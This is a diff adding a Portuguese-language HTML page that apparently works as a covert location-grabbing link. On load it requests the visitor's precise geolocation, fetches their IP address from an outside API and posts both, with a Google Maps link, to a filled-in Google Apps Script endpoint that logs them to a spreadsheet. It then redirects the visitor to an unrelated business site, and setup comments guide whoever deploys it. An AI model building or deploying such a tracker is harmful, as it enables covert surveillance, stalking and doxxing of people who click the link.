@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Localizando...</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+  </style>
+  <script>
+    // <<< VOCÊ PRECISA COLAR A URL DO SEU APPS SCRIPT AQUI! >>>
+    // Obtida no Passo 5 da Parte 1 ("URL do aplicativo da Web")
+    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbwW8qceLL5QulY7XStPxvQv3WEXxcBSH4k3czF2_VkE3wKwBXwqYsk3ZsYMP0IgxPV7/exec'; // <<< SUBSTITUA ISTO!
+
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sucesso, erro, {
+          enableHighAccuracy: true, // Tenta obter a melhor precisão possível
+          timeout: 10000,           // Tempo máximo para obter a localização (10 segundos)
+          maximumAge: 0             // Força a obtenção de uma nova localização a cada vez
+        });
+      } else {
+        document.body.innerHTML = "<p>Seu navegador não suporta geolocalização.</p>";
+        // Redireciona mesmo se não suportar geolocalização
+        redirecionaSiteAlvo();
+      }
+    };
+
+    async function sucesso(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // URL para o Google Maps com as coordenadas
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      try {
+        // Captura o IP do visitante de uma API externa
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        // Envia os dados para sua planilha no Google Sheets (via Google Apps Script)
+        const response = await fetch(WEBAPP_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            latitude: latitude,
+            longitude: longitude,
+            ip: ip,
+            maps: mapsLink
+          })
+        });
+
+        const result = await response.json(); // Pega a resposta JSON do Apps Script
+
+        if (result.success) {
+          console.log("Dados registrados com sucesso no Google Sheets!");
+        } else {
+          console.error("Erro ao registrar os dados no Google Sheets:", result.message);
+          // Você pode exibir uma mensagem de erro na tela aqui, se quiser
+        }
+
+      } catch (error) {
+        console.error("Erro na requisição ou processamento dos dados:", error);
+        // Você pode exibir uma mensagem de erro na tela aqui, se quiser
+      } finally {
+        // Após a tentativa de registro (sucesso ou falha), redireciona
+        redirecionaSiteAlvo();
+      }
+    }
+
+    function erro(err) {
+      console.warn("Geolocalização não permitida ou erro:", err);
+      let errorMessage = "⚠️ É necessário permitir a localização para continuar.";
+      switch(err.code) {
+        case err.PERMISSION_DENIED:
+          errorMessage = "Permissão de localização negada. Por favor, permita para continuar.";
+          break;
+        case err.POSITION_UNAVAILABLE:
+          errorMessage = "Localização indisponível. Tente novamente mais tarde.";
+          break;
+        case err.TIMEOUT:
+          errorMessage = "Tempo esgotado para obter a localização. Verifique sua conexão.";
+          break;
+        case err.UNKNOWN_ERROR:
+          errorMessage = "Ocorreu um erro desconhecido ao obter a localização.";
+          break;
+      }
+      document.body.innerHTML = `<p>${errorMessage}</p>`;
+      // Redireciona mesmo se houver erro de geolocalização, após exibir a mensagem
+      setTimeout(redirecionaSiteAlvo, 3000); // Redireciona após 3 segundos para o usuário ler a mensagem
+    }
+
+    function redirecionaSiteAlvo() {
+      window.location.href = "https://www.despachanteespindola.com/"; // <<< SEU SITE DE DESTINO
+    }
+  </script>
+</head>
+<body>
+  <p>📍 Obtendo sua localização... Aguarde...</p>
+</body>
+</html>
